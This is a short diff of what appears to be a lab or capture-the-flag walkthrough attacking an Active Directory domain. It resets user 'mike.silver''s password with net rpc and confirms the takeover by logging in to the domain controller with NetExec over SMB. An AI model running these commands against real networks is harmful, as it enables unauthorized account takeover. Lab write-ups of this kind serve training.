@@ -445,6 +445,12 @@ net rpc password "mike.silver" 'Password123!' -U "dismay.hsm"/"jena.yamazaki"%'P
 This changed the users password
 
 ```python
-
+nxc smb dc1.dismay.hsm -u mike.silver -p 'Password123!'                                       
+SMB         10.0.16.4       445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:dismay.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.16.4       445    DC1              [+] dismay.hsm\mike.silver:Password123!
 ```
+This user is now compromised!
+
+## `mike.silver` outbound object control
+
 
